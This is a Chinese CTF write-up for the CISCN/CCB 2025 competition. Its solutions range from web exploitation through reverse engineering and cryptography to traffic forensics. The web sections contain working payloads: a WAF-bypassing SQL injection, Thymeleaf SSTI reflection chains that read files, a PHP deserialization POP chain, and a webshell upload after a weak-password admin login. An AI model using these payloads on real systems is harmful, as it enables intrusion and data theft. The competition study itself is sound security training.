---
title: ciscn&ccb
date: 2025-12-28 09:00:51
updated: 2025-12-30 03:31:53
tags:
  - WriteUp
  - CTF
---
## **三、 解题过程**

  

# AI\_WAF

得到数据名nexadata

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766912678921-91ca06c9-2aec-473f-a46b-78adda7bce3f.png)

得到表名where\_is\_my\_flagggggg![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766912750676-cf657d20-9901-40f9-bf1d-383cf111fc87.png)

得到列名Th15\_ls\_f149

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766912724819-a263581e-f292-4e07-a3be-1f2a94c81a21.png)

```java
' /*!44440UNION*/ /*!50000SELECT*/ 1,database(),Th15_ls_f149 from where_is_my_flagggggg#
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766912622030-29eaec5c-452b-49e3-a77e-e8751476231d.png)

flag{1b25fd71-86e5-46ec-8c54-0af4d6977307}

# EzJava

弱口令admin/admin123

登入后发现模版渲染功能，通过获取string对象class类后反射加载java.io.File执行listRoots方法

查看目录，发现flag

```java
[[${#strings.class.forName("java.io.File").getMethod("listRoots").invoke(null)[0].list()[19]}]]
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766912934171-a15c2565-a07d-46fe-a01b-0d053b10045d.png)

反射加载类对象方法，file协议读取flag

```java
[[${#strings.class.forName("org.springframework.util.StreamUtils").getMethod("copyToString",#strings.class.forName("java.io.InputStream"),#strings.class.forName("java.nio.charset.Charset")).invoke(null,#strings.class.forName("java.net.URI").getMethod("create",#strings.class.forName("java.lang.String")).invoke(null,#strings.concat("file:///","f","lag_y0u_d0nt_kn0w")).toURL().openStream(),#strings.class.forName("java.nio.charset.StandardCharsets").getField("UTF_8").get(null))}]]
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766912996543-e349ca1e-4810-41a5-a2c9-51c21129dcbd.png)

flag{dd3a62b5-7038-4e60-bd64-76cd6e84b1c9}

# hellogate

查看源代码拿到源码

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913384785-b409bd3f-6ec7-4fe0-85c5-192519820a7a.png)

编写pop链

```php
<?php
error_reporting(0);
class A {
  public $handle;
  //    public function triggerMethod() {
  //        echo "" . $this->handle;
  //    }
}
class B {
  public $worker;
  public $cmd;
  //    public function __toString() {
  //        return $this->worker->result;
  //    }
}
class C {
  public $cmd;
  //    public function __get($name) {
  //        echo file_get_contents($this->cmd);
  //    }
}
//$raw = isset($_POST['data']) ? $_POST['data'] : '';
//header('Content-Type: image/jpeg');
//readfile("muzujijiji.jpg");
//highlight_file(__FILE__);
//$obj = unserialize($_POST['data']);
//$obj->triggerMethod();

$c=new C();
$c->cmd='/flag';

$b=new B();
$b->worker=$c;

$a=new A();
$a->handle=$b;

$payload=serialize($a);
echo $payload;
echo "\n";
echo urlencode($payload);
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913250336-58b47069-e1cc-49ee-87f1-8fc651c0716d.png)

flag{7db03050-58cb-4f0a-8fd7-fa68191a31cd}

# redjs

Next.js利用工具一把嗦

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913439469-9321a4d9-4504-408f-bcab-e495d855022b.png)

flag{19958188-c675-4181-87e6-4cd3f471d412}

# dedecms

注册测试账号

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913626601-349ed8fa-8076-41f5-9742-1be32373b4c8.png)

登录后发现存在Aa123456789用户

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913651409-a792bbc9-197c-448f-bace-d5a98bc34b5c.png)

发现后台/dede，尝试登录Aa123456789/Aa123456789成功

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913720323-9ec47dd2-e09d-46d9-9f54-065399cf53b8.png)

进入后台，上传webshell蚁剑链接

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913508026-4f960afd-7091-46b0-bcaf-43e191d53194.png)![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766918750006-43dbb2a1-a240-4818-82ea-38684f3bb9d3.png)

根目录下获取flag![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913566138-1f29eaee-4977-41b2-b11c-84c9622ae9bf.png)

flag{65d457e3-7604-4e42-9f69-87efbfa8db5f}

# babygame

使用gdre\_tools反编译出项目文件，找到flag加密逻辑和密钥

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766913275946-ac9d6b7a-bb2c-44f8-a52b-52762cb28917.png)

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766913296372-8b75a8cf-6575-4d13-8c91-7ac755c8ee0e.png)

把密钥中的A替换成B后进行AES加密

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766913449030-df454313-d940-4728-9493-de99dbb81a7f.png)

解密后得到flag

flag值：

flag{wOW~youAregrEaT!}

# wasm-login

分析index.html，找到check成功时间戳的md5值

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766913957761-8db4e401-13d4-49ab-8333-c42405000b37.png)

从 release.wasm.map可以找到加密的关键逻辑

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766914115546-24a1dd43-9694-4d40-b0d3-4db66bb0b2fb.png)

这里对base64进行了换码表操作

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766914205719-e1a684e2-43d8-4921-8a08-ae6058779e46.png)

还有对HMAC进行的自定义更改

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766914362950-398666ca-c152-41f8-a317-d94302bfe69d.png)

根据加密逻辑逐步进行解密即可

![image.png](https://cdn.nlark.com/yuque/0/2025/png/50924521/1766915534657-ec8d27ac-044b-4c47-9d6d-48efa5f439d3.png)​

解密脚本：

```python
import sys
import struct
import zipfile
import hashlib
from typing import Optional, Tuple, BinaryIO
from pathlib import Path

TARGET_PREFIX = "ccaf33e3512e31f3"
ALPHA = "NhR4UJ+z5qFGiTCaAIDYwZ0dLl6PEXKgostxuMv8rHBp3n9emjQf1cWb2/VkS7yO"
PAD = "="

def custom_b64_encode(data: bytes) -> str:
    result = []
    n = len(data)
    i = 0
    
    while i + 3 <= n:
        b10 = (data[i] << 16) | (data[i + 1] << 8) | data[i + 2]
        result.extend([
            ALPHA[(b10 >> 18) & 63],
            ALPHA[(b10 >> 12) & 63],
            ALPHA[(b10 >> 6) & 63],
            ALPHA[b10 & 63]
        ])
        i += 3

    remaining = n - i
    if remaining == 1:
        b10 = data[i] << 16
        result.extend([
            ALPHA[(b10 >> 18) & 63],
            ALPHA[(b10 >> 12) & 63],
            PAD,
            PAD
        ])
    elif remaining == 2:
        b10 = (data[i] << 16) | (data[i + 1] << 8)
        result.extend([
            ALPHA[(b10 >> 18) & 63],
            ALPHA[(b10 >> 12) & 63],
            ALPHA[(b10 >> 6) & 63],
            PAD
        ])

    return "".join(result)

def compute_sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()

def hmac_sha256_variant(key: bytes, message: bytes) -> bytes:
    BLOCK_SIZE = 64
    
    if len(key) > BLOCK_SIZE:
        key = compute_sha256(key)
    
    padded_key = key + b"\x00" * (BLOCK_SIZE - len(key))
    
    ipad = bytes(b ^ 0x76 for b in padded_key)
    opad = bytes(b ^ 0x3C for b in padded_key)
    
    inner_hash = compute_sha256(ipad + message)
    return compute_sha256(inner_hash + opad)

def extract_ut_timestamp(info: zipfile.ZipInfo) -> Optional[int]:
    extra = info.extra
    pos = 0
    
    while pos + 4 <= len(extra):
        header_id = extra[pos:pos + 2]
        data_size = struct.unpack("<H", extra[pos + 2:pos + 4])[0]
        data = extra[pos + 4:pos + 4 + data_size]
        pos += 4 + data_size

        if header_id == b"UT" and data_size >= 5:
            flags = data[0]
            if flags & 1:
                return struct.unpack("<I", data[1:5])[0]
    return None

def get_timestamp_range(zip_path: str) -> Tuple[int, int]:
    with zipfile.ZipFile(zip_path, "r") as zf:
        release_js_info = zf.getinfo("build/release.js")
        build_dir_info = zf.getinfo("build/")
        
        start_time = extract_ut_timestamp(release_js_info)
        end_time = extract_ut_timestamp(build_dir_info)
        
        if start_time is None or end_time is None:
            raise RuntimeError("UT timestamp not found in zip extra fields")
            
        return start_time, end_time

def create_auth_message(username: str, password: str) -> Tuple[bytes, bytes, bytes]:
    encoded_password = custom_b64_encode(password.encode("utf-8"))
    message_bytes = f'{{"username":"{username}","password":"{encoded_password}"}}'.encode("utf-8")
    
    prefix_bytes = f'{{"username":"{username}","password":"{encoded_password}","signature":"'.encode("utf-8")
    suffix_bytes = b'"}'
    
    return message_bytes, prefix_bytes, suffix_bytes

def find_valid_signature(
    start_ms: int,
    end_ms: int,
    message_bytes: bytes,
    prefix_bytes: bytes,
    suffix_bytes: bytes
) -> str:
    base_md5 = hashlib.md5(prefix_bytes)
    
    for timestamp in range(start_ms, end_ms + 1):
        sig = hmac_sha256_variant(str(timestamp).encode("utf-8"), message_bytes)
        sig_b64 = custom_b64_encode(sig).encode("utf-8")
        
        h = base_md5.copy()
        h.update(sig_b64)
        h.update(suffix_bytes)
        check = h.hexdigest()
        
        if check.startswith(TARGET_PREFIX):
            return f"flag{{{check}}}"
            
    raise RuntimeError("No valid signature found in given time window")

def main() -> None:
    zip_path = sys.argv[1] if len(sys.argv) > 1 else "wasm-login_4ce9f4b3cee8956ac085b957322ef608.zip"
    
    if not Path(zip_path).exists():
        raise FileNotFoundError(f"Zip file not found: {zip_path}")
    
    try:
        start_sec, end_sec = get_timestamp_range(zip_path)
        start_ms = start_sec * 1000
        end_ms = end_sec * 1000
        
        message_bytes, prefix_bytes, suffix_bytes = create_auth_message("admin", "admin")
        
        flag = find_valid_signature(start_ms, end_ms, message_bytes, prefix_bytes, suffix_bytes)
        print(flag)
        
    except Exception as e:
        print(f"Error: {str(e)}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
```

flag值：

flag{ccaf33e3512e31f36228f0b97ccbc8f1}

# ECDSA

先对Welcome to this challenge!执行 SHA-512 哈希运算得到对应大整数，通过取模操作使其符合 NIST P-521 曲线的私钥取值范围，以此完成私钥的生成；借助 nonce (i) 函数将消息索引与固定字符串「bias」拼接后哈希，为每条消息生成专属的确定性随机数（Nonce）；解密阶段则依据 NIST P-521 曲线的阶，通过计算公式d=(s⋅k−e)⋅r−1modN 恢复出私钥，最终输出已还原的私钥本身及其 MD5 哈希值。

```python
import hashlib
import os
from typing import List, Tuple

P521_MOD = int("01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409", 16)
P521_BYTES = (521 + 7) // 8

def modinv(a: int, n: int) -> int:
    return pow(a, -1, n)

def sha1_to_int(m: bytes) -> int:
    return int.from_bytes(hashlib.sha1(m).digest(), "big")

def gen_nonce(i: int) -> int:
    return int.from_bytes(hashlib.sha512(b"bias" + bytes([i])).digest(), "big")

def parse_sigs(txt: str) -> List[Tuple[bytes, bytes]]:
    return [(bytes.fromhex(parts[0]), bytes.fromhex(parts[1])) for line in txt.splitlines() if (parts := line.split(":")) and len(parts) == 2]

def recover_priv(msg: bytes, sig: bytes) -> int:
    r, s = int.from_bytes(sig[:P521_BYTES], "big"), int.from_bytes(sig[P521_BYTES:], "big")
    if not (msg.startswith(b"message-") and len(msg) == len(b"message-") + 1):
        raise ValueError(f"Unexpected: {msg!r}")
    k = gen_nonce(msg[-1])
    e = sha1_to_int(msg)
    return ((s * k - e) * modinv(r, P521_MOD)) % P521_MOD

def int_to_md5(x: int) -> str:
    return hashlib.md5(str(x).encode()).hexdigest()

def main():
    sig_file = os.path.expanduser("./signatures.txt")
    if not os.path.exists(sig_file):
        raise FileNotFoundError(f"File not found: {sig_file}")

    with open(sig_file, "r", encoding="utf-8") as f:
        sig_content = f.read()

    sig_pairs = parse_sigs(sig_content)
    if not sig_pairs:
        raise ValueError("No signatures parsed.")

    priv_key = recover_priv(sig_pairs[0][0], sig_pairs[0][1])
    for idx, (msg, sig) in enumerate(sig_pairs[1:], 1):
        if recover_priv(msg, sig) != priv_key:
            raise SystemExit(f"!!!#{idx}")

    print(f"flag{{{int_to_md5(priv_key)}}}")

if __name__ == "__main__":
    main()
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766916374475-fb6667fa-32b4-4113-b7f4-37b94572d55f.png)

flag{581bdf717b780c3cd8282e5a4d50f3a0}

# EzFlag

IDA打开,主函数有加密逻辑

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766916049755-30ff8ce6-768d-41ca-ac47-7c1a6fd31e8f.png)

f函数和查看字符串

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766916475263-b6c7d4c6-07f7-4033-8f14-b115d7f928f7.png)

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766916512204-099fb179-4303-4d06-ab50-4c3e1c440f62.png)

分析主函数加密部分得到：  
程序会调用一个函数f(v11)，它用来生成一些加密或混淆的字符。每次迭代时，v11 被初始化为1LL，并在每次循环中乘以8 并加上 (i + 64)，其中i 是从0 到31 的计数器。f(v11) 函数生成的结果是一个字符，并且这些字符逐个打印到标准输出流中。每个生成的字符会被输出，并在特定的迭代（例如，第8、13、18、23 次迭代）后加上一个 -，用来分隔flag 的部分，而我们继续跟进函数，理解到相当于是使用斐波那契数列对16取模作为索引，而映射表正好是在字符串中，按照参数a1 进行迭代，使用v5 和v4 来混淆计算过程。每次迭代更新v5 和v4 的值，并且通过& 0xF 操作确保v4 保持在4 位数值范围内（0 到 15）。最终，函数通过 v5 作为索引，返回字符串K 中对应位置的字符

```python
c = "012ab9c3478d56ef"
f = [0, 1]
while len(f) < 24: f.append((f[-1] + f[-2]) % 16)
b = "".join(c[f[i % 24]] + ("-" if r % 5 == 7 else "") for i, r in enumerate(range(32)))
print(f"flag{{{b}}}")
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766916788989-115fdf19-b410-47b5-84af-3b928b96c496.png)

flag{10632674-1d219-09f29-14769-f60219a24}

# RSA\_NestingDoll

通过对代码分析可知，此段代码实现了双层嵌套 RSA 密钥对的生成机制，密钥对的核心构成是四个独立的大素数 p1、q1、r1、s1；其中内层 RSA 加密的核心模数定义为 n1，而外层 RSA 的核心模数 n，则是通过代码中封装的 get\_smooth\_prime 函数生成的平滑数来构建；在数据加密环节，核心目标 flag 是通过内层 RSA 加密算法完成加密的。针对该双层 RSA 加密体系，可行的破解思路为：采用 Pollard's p-1 高效大数分解算法，依托数论中的约数关联特性、RSA 模数的素因子分解方法，以及欧拉函数 (φ) 的核心计算规则，逐步推导还原出加密所需的核心私钥信息；再通过暴力破解的方式依次求解出内层 RSA 密钥对与外层 RSA 密钥对对应的私钥，最终通过还原的私钥完成密文的解密运算，成功破解并得到原始的 flag 内容。

```python
from Crypto.Util.number import *
import math, sys

def get_primes(limit):
    primes_list = []
    is_prime = [1]*(limit+1)
    for i in range(2, limit+1):
        if is_prime[i]:
            primes_list.append(i)
            for j in range(i*i, limit+1, i):
                is_prime[j] = 0
    return primes_list

primes = get_primes(1<<21)

def pollards_p_minus_1(num, exp):
    for base in (2,3,5):
        res = pow(base, exp, num)
        gcd_val = math.gcd(res-1, num)
        if 1 < gcd_val < num:
            return gcd_val
        res0 = res
        mul = 1
        for prime in primes:
            mul *= prime
            if mul.bit_length() > 2048:
                res = pow(res, mul, num)
                gcd_val = math.gcd(res-1, num)
                if 1 < gcd_val < num:
                    return gcd_val
                res0, res, mul = res, res, 1
        gcd_val = math.gcd(pow(res, mul, num)-1, num)
        if 1 < gcd_val < num:
            return gcd_val
    return None

data = open('./output.txt').read()
n_inner = int(data.split('inner RSA modulus = ')[1].split()[0])
n_outer = int(data.split('outer RSA modulus = ')[1].split()[0])
ct = int(data.split('Ciphertext = ')[1].split()[0])

factors = []
tmp_num = n_outer
while len(factors) < 4:
    p = pollards_p_minus_1(tmp_num, n_inner)
    if not p or tmp_num % p:
        break
    factors.append(p)
    tmp_num //= p
    if len(factors) == 3:
        factors.append(tmp_num)
        break

if len(factors) != 4:
    sys.exit(0)

inner_factors = [math.gcd(p-1, n_inner) for p in factors]
if math.prod(inner_factors) != n_inner:
    sys.exit(0)

phi_val = math.prod(x-1 for x in inner_factors)
d_val = inverse(65537, phi_val)
print(long_to_bytes(pow(ct, d_val, n_inner)))
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766919009506-d3dc501c-7532-4d99-8079-8b0d916e4963.png)flag{fak3\_r5a\_0f\_euler\_ph1\_of\_RSA\_040a2d35}

# SnakeBackdoor-1

找到登录成功的跳转数据包，密码zxcvbnm123

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913824802-799bc66c-ba41-42f9-904c-4b6692016465.png)

flag{zxcvbnm123}

# SnakeBackdoor-2

搜索SECRET\_KEY找到包含SECRET\_KEY的http响应包，将html代码拿去厨子解码得到'SECRET\_KEY': 'c6242af0-6891-4510-8432-e1cdf051f160'

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913911608-0c846368-6c45-4683-8785-b896e460cdeb.png)![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766913986601-27b0b22a-b0bc-44de-840d-82f84d7afffe.png)flag{c6242af0-6891-4510-8432-e1cdf051f160}

# SnakeBackdoor-3

发现存在执行命令的数据包

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914269908-569635f2-5976-41be-8bd1-d98f0d7bd101.png)

将base64字符串解码得到混淆代码

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914312539-0c4b2591-0cbb-43a7-b19c-b0d3568d7655.png)

写脚本反混淆

```python
import base64
import zlib
import re

def extract_next_ciphertext(decompressed_data: bytes) -> bytes:
    pattern = rb"b'([^']+)'"
    match = re.search(pattern, decompressed_data)
    if match:
        return match.group(1)
    return None

def decrypt_round(ciphertext: bytes) -> tuple[bytes, bytes]:
    try:
        reversed_cipher = ciphertext[::-1]
        b64_decoded = base64.b64decode(reversed_cipher)
        decompressed = zlib.decompress(b64_decoded)
        next_cipher = extract_next_ciphertext(decompressed)
        return decompressed, next_cipher
    except Exception as e:
        print(f"解密出错：{e}")
        return decompressed, None

def loop_decrypt(initial_cipher: bytes) -> bytes:
    current_cipher = initial_cipher
    round_num = 1

    while True:
        print(round_num)
        decompressed, next_cipher = decrypt_round(current_cipher)

        print(f"\n{decompressed[:500]}...")

        if next_cipher is None:
            print("\n")
            return decompressed

        current_cipher = next_cipher
        round_num += 1

if __name__ == "__main__":
    initial_cipher = b'=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'
    final_plaintext = loop_decrypt(initial_cipher)
    print(final_plaintext.decode('utf-8', errors='ignore'))
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914342840-e0407bc2-54e2-4beb-b544-4f6b545b9e96.png)

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914369648-3054825b-4fc1-411d-a11d-e23efecb7674.png)

得到RC4\_SECRET = b'v1p3r\_5tr1k3\_k3y'

flag{v1p3r\_5tr1k3\_k3y}

# SnakeBackdoor-4

在流量中发现加密通信密文data=a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914618018-aa221766-f28e-48bd-95a8-6c0432195221.png)

通过上一题rc4加密脚本写出解密脚本

```python
import binascii

RC4_SECRET = b'v1p3r_5tr1k3_k3y'

def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    res = bytearray()
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        res.append(char ^ S[(S[i] + S[j]) % 256])
    return bytes(res)

cipher_hex = "a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351"
cipher_bytes = binascii.unhexlify(cipher_hex)

plain_bytes = rc4_crypt(cipher_bytes, RC4_SECRET)
print( plain_bytes)
print(plain_bytes.decode('utf-8', errors='ignore'))
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914555710-547c54ae-8895-4959-b190-48da4f70892c.png)

得到文件名为python3.13

flag{python3.13}

# 问卷

![bf5cdfe20fdf447e9f7cf40f89dbffd6.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1766914698215-85ed5feb-fe94-4100-b0d1-6b0b5749b4f7.png)

flag{智守国赛，十九年华}